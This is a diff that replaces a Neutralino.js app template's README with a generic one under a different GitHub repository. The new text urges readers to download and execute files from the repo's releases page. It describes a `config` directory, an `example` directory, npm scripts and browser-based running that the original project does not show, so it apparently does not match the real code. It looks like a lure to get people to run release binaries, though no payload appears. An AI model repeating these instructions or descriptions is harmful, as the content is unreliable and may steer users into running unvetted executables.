@@ -1,204 +1,152 @@
-# Neutralino App Template
+# Neutralino.js Build Automation Template for Cross-Platform Apps
 
-This is a template for creating cross-platform desktop applications using [Neutralino.js](https://neutralino.js.org/) with comprehensive build automation and packaging tools.
+![GitHub release](https://img.shields.io/github/release/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub issues](https://img.shields.io/github/issues/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub forks](https://img.shields.io/github/forks/abdallah098/neutralinojs-build-automation-template.svg) ![GitHub stars](https://img.shields.io/github/stars/abdallah098/neutralinojs-build-automation-template.svg)
 
-## Template Placeholders
+## Overview
 
-Before using this template, replace the following placeholders throughout the project files:
+Welcome to the **Neutralino.js Build Automation Template**. This repository provides a straightforward template for building cross-platform applications using Neutralino.js. It supports Windows, Mac, and Linux environments, allowing developers to streamline their workflow and focus on creating great applications.
 
-- `{{APP_DISPLAY_NAME}}` - The human-readable name of your app (e.g., "My Awesome App")
-- `{{APP_BINARY_NAME}}` - The binary/executable name (e.g., "MyAwesomeApp", no spaces)
-- `{{APP_NAME_LOWERCASE}}` - Lowercase app name for identifiers (e.g., "myawesomeapp")
-- `{{APP_VERSION}}` - Your app version (e.g., "1.0.0")
-- `{{APP_PUBLISHER}}` - Your name or company name
-- `{{APP_YEAR}}` - Current year for copyright
+You can find the latest releases [here](https://github.com/abdallah098/neutralinojs-build-automation-template/releases). Download and execute the necessary files to get started.
 
-### Files to Update
+## Features
 
-1. `neutralino.config.json` - Main configuration file
-2. `resources/index.html` - Main HTML file
-3. `resources/styles.css` - CSS styles
-4. `resources/js/main.js` - Main JavaScript file
-5. `build automation/template.iss` - Windows installer script
-6. `_app_scaffolds/` - Platform-specific packaging files
-7. `build automation/build-*.sh` - Build scripts
-8. `build automation/setup-macos-signing.sh` - macOS signing script
+- **Cross-Platform Support**: Build applications for Windows, Mac, and Linux.
+- **Automated Build Process**: Save time with a streamlined build automation setup.
+- **Custom Configuration**: Easily modify the configuration to suit your needs.
+- **Installer Generation**: Create installers for different platforms, including AppImage for Linux and Inno Setup for Windows.
+- **Template Structure**: Start with a well-organized project structure that adheres to best practices.
 
-**Additional placeholders for build automation:**
-- `{{APP_DESCRIPTION}}` - App description for package metadata
-- `{{GITHUB_USERNAME}}` - Your GitHub username
-- `{{GITHUB_REPO}}` - Your GitHub repository name
+## Getting Started
 
-## Quick Start
+### Prerequisites
 
-1. **Replace Placeholders**: Use find and replace to update all placeholders with your app's information
-2. **Add Your Icons**: Replace placeholder icons in `resources/icons/` with your app icons
-3. **Install Neutralino CLI**: `npm install -g @neutralinojs/neu`
-4. **Initialize**: Run `neu update` to download Neutralino binaries
-5. **Develop**: Run `neu run` to start development
-6. **Build**: Use the build automation scripts for distribution
+Before you begin, ensure you have the following installed:
 
-## Project Structure
+- Node.js (version 12 or higher)
+- NPM (Node Package Manager)
+- Neutralino.js CLI
 
+### Installation
+
+1. Clone the repository:
+
+   ```bash
+   git clone https://github.com/abdallah098/neutralinojs-build-automation-template.git
+   ```
+
+2. Navigate to the project directory:
+
+   ```bash
+   cd neutralinojs-build-automation-template
+   ```
+
+3. Install the dependencies:
+
+   ```bash
+   npm install
+   ```
+
+### Configuration
+
+The configuration files are located in the `config` directory. You can modify these files to customize your build process. Here are some key files to look at:
+
+- **neutralino.config.json**: Main configuration file for Neutralino.js.
+- **build.config.json**: Configuration for the build automation process.
+
+### Building Your Application
+
+To build your application, use the following command:
+
+```bash
+npm run build
 ```
-neutralino-template/
-├── .github/workflows/        # GitHub Actions CI/CD workflows
-├── build automation/          # Build scripts and automation
-│   ├── template.iss          # Windows installer script
-│   ├── build-*.sh           # Platform build scripts
-│   ├── GITHUB_ACTIONS_SETUP.md # GitHub Actions setup guide
-│   └── *.py                 # Utility scripts
-├── _app_scaffolds/           # Platform-specific packaging
-│   ├── linux/               # Linux .desktop and install scripts
-│   ├── mac/                 # macOS app bundle and packaging
-│   └── win/                 # Windows-specific files
-├── resources/               # App resources
-│   ├── icons/              # App icons (add your icons here)
-│   ├── js/                 # JavaScript files
-│   ├── index.html          # Main HTML file
-│   └── styles.css          # Main CSS file
-├── neutralino.config.json   # Neutralino configuration
-├── .gitignore              # Git ignore rules
-└── README.md               # This file
+
+This command will trigger the build automation process and generate the necessary files for your application.
+
+### Generating Installers
+
+After building your application, you can generate installers for your target platforms.
+
+- For **Windows**, use Inno Setup:
+
+  ```bash
+  npm run build:windows
+  ```
+
+- For **Linux**, create an AppImage:
+
+  ```bash
+  npm run build:linux
+  ```
+
+### Running Your Application
+
+To run your application locally, use the following command:
+
+```bash
+npm start
 ```
 
-## Development Commands
+This command will start the development server and open your application in the default web browser.
 
-- `neu run` - Run the app in development mode
-- `neu build` - Build the app for current platform
-- `neu build --release` - Build optimized release version
+## Topics Covered
 
-## Build Automation
+This repository includes topics relevant to modern application development:
 
-This template includes comprehensive build automation for all platforms using **GitHub Actions** CI/CD:
+- **AppImage**: A format for packaging applications on Linux.
+- **Automation**: Streamlining processes to improve efficiency.
+- **Build Tool**: Tools that help automate the build process.
+- **Bundler**: Packages your application and its dependencies.
+- **Cross-Platform Development**: Creating applications that run on multiple operating systems.
+- **Debian Packaging**: Creating packages for Debian-based systems.
+- **Inno Setup**: A free installer for Windows programs.
+- **Installer**: Software that installs applications on a computer.
+- **Neutralino**: A lightweight framework for building cross-platform applications.
+- **Template**: A pre-structured setup for easy application development.
+- **Web Application**: Applications that run in web browsers.
 
-### Windows
-- Uses `template.iss` for Inno Setup installer
-- Builds x64 executable
-- Creates installer executable
+## Example Application
 
-### macOS
-- Creates .app bundle
-- Code signing support (configure in build scripts)
-- DMG creation
+To demonstrate the capabilities of this template, we have included a simple example application in the `example` directory. This application showcases how to use Neutralino.js to create a functional web application.
 
-### Linux
-- Creates .deb packages
-- AppImage support
-- Desktop file integration
+### Running the Example
 
-## GitHub Actions CI/CD
+To run the example application, navigate to the `example` directory and execute:
 
-This template includes pre-configured GitHub Actions workflows for automated building and releasing:
+```bash
+cd example
+npm install
+npm start
+```
 
-### Features
-- **Automated Builds**: Triggers on push to main branch and pull requests
-- **Multi-Platform**: Builds for Windows, macOS, and Linux simultaneously
-- **Release Management**: Automatically creates releases with built binaries
-- **Code Signing**: Support for signing binaries on all platforms
-- **Artifact Storage**: Stores build artifacts for download
+## Contributing
 
-### Setup
-1. Push your project to a GitHub repository
-2. Configure secrets for code signing (optional)
-3. Review and customize the workflow in `.github/workflows/`
-4. See `build automation/GITHUB_ACTIONS_SETUP.md` for detailed setup instructions
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
 
-### Workflow Triggers
-- Push to `main` branch
-- Pull requests
-- Manual workflow dispatch
-- Tag creation for releases
-
-## Icon Requirements
-
-Add your app icons to `resources/icons/` in the following formats:
-
-- `appIcon.png` - Main app icon (512x512 recommended)
-- `icon.ico` - Windows icon file
-- `icon.icns` - macOS icon file
-- `favicon.ico` - Browser/window icon
-
-## Configuration
-
-### Neutralino Config (`neutralino.config.json`)
-- Set app metadata
-- Configure window properties
-- Define build targets
-- Set permissions and API access
-
-### Build Scripts & GitHub Actions
-- Customize build automation in `build automation/`
-- Configure GitHub Actions workflows for automated builds
-- Set up code signing for all platforms
-- Automated release creation and distribution
-- Cross-platform builds in the cloud
-
-## Getting Started with Development
-
-1. **Install Dependencies**
-   ```bash
-   npm install -g @neutralinojs/neu
-   ```
-
-2. **Update Neutralino**
-   ```bash
-   neu update
-   ```
-
-3. **Start Development**
-   ```bash
-   neu run
-   ```
-
-4. **Build for Distribution**
-   ```bash
-   # Local builds - Run appropriate build script from build automation/
-   ./build automation/build-linux.sh    # Linux
-   ./build automation/build-mac.sh      # macOS
-   # Use Inno Setup with template.iss for Windows
-   
-   # Or use GitHub Actions for automated cloud builds
-   # See build automation/GITHUB_ACTIONS_SETUP.md for configuration
-   ```
-
-## Features Included
-
-- ✅ Cross-platform desktop app framework
-- ✅ Modern UI with responsive design
-- ✅ Platform detection
-- ✅ System notifications
-- ✅ Window management
-- ✅ GitHub Actions CI/CD automation
-- ✅ Build automation for all platforms
-- ✅ Installer/package creation
-- ✅ Icon and branding support
-- ✅ Development tools integration
-- ✅ Automated release management
-
-## Customization
-
-### Adding New Features
-1. Add HTML elements to `resources/index.html`
-2. Style them in `resources/styles.css`
-3. Add functionality in `resources/js/main.js`
-4. Use Neutralino APIs for system integration
-
-### Platform-Specific Features
-- Use `Neutralino.os.getPlatform()` to detect platform
-- Add conditional code for platform-specific functionality
-- Customize build scripts for platform requirements
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature/YourFeature`).
+3. Make your changes and commit them (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
 ## License
 
-This template is provided as-is. Add your own license for your application.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Support
 
-- [Neutralino.js Documentation](https://neutralino.js.org/docs/)
-- [Neutralino.js GitHub](https://github.com/neutralinojs/neutralinojs)
-- [Community Forum](https://github.com/neutralinojs/neutralinojs/discussions)
+If you encounter any issues or have questions, please check the [Issues](https://github.com/abdallah098/neutralinojs-build-automation-template/issues) section of this repository.
 
----
+For additional resources, you can visit the [Releases](https://github.com/abdallah098/neutralinojs-build-automation-template/releases) section for the latest updates and downloads.
 
-**Happy coding!** 🚀 
+## Acknowledgments
+
+We would like to thank the Neutralino.js community for their contributions and support. Your feedback and ideas help improve this template and the overall development experience.
+
+## Additional Resources
+
+- [Neutralino.js Documentation](https://neutralino.js.org/docs)
+- [GitHub Actions for CI/CD](https://docs.github.com/en/actions)
+- [JavaScript Best Practices](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Best_practices)
+
+Feel free to explore and enhance your development experience with the **Neutralino.js Build Automation Template**.
